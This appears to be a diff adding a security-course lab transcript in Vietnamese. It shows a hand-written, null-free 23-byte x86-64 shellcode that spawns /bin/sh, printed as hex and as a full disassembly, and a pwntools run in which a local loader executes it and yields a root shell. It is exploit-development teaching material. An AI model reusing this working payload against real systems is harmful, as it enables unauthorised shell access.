@@ -1,0 +1,42 @@
+### Lab 4.1 transcript ###
+# Moi truong kiem thu THAT:
+#   Ubuntu 24.04.4 LTS, kernel 6.8.0-134-generic
+#   glibc 2.39 (Ubuntu GLIBC 2.39-0ubuntu8.9)
+#   gcc 13.3.0, pwntools (venv)
+# Chay lai 8/8 deu lay duoc shell.
+
+$ uname -a ; ldd --version | head -1
+Linux ubuntu24 6.8.0-134-generic #134-Ubuntu SMP PREEMPT_DYNAMIC x86_64 GNU/Linux
+ldd (Ubuntu GLIBC 2.39-0ubuntu8.9) 2.39
+
+$ bash build.sh
+[*] built: loader
+
+$ python3 exploit.py
+[*] shellcode viet tay: 23 byte
+[*] null-free (khong chua byte 0x00)? True
+[*] hex: 31f65648bf2f62696e2f2f736857545f31d26a3b580f05
+[*] shellcraft.amd64.linux.sh(): 48 byte
+[x] Starting local process './loader'
+[+] Starting local process './loader': pid 441766
+[x] Receiving all data
+[+] Receiving all data: Done (140B)
+[loader] 23 byte shellcode @ 0x755040ac9000, nhay vao...
+===PWNED_4_1===
+uid=0(root) gid=0(root) groups=0(root)
+6.8.0-134-generic
+===END===
+
+[+] shellcode viet tay chay ra shell that
+
+# Disasm shellcode viet tay (23 byte, null-free):
+#    0:  31 f6                 xor    esi, esi
+#    2:  56                    push   rsi
+#    3:  48 bf 2f 62 69 6e 2f 2f 73 68   movabs rdi, 0x68732f2f6e69622f  ; "/bin//sh"
+#    d:  57                    push   rdi
+#    e:  54                    push   rsp
+#    f:  5f                    pop    rdi
+#   10:  31 d2                 xor    edx, edx
+#   12:  6a 3b                 push   0x3b
+#   14:  58                    pop    rax
+#   15:  0f 05                 syscall
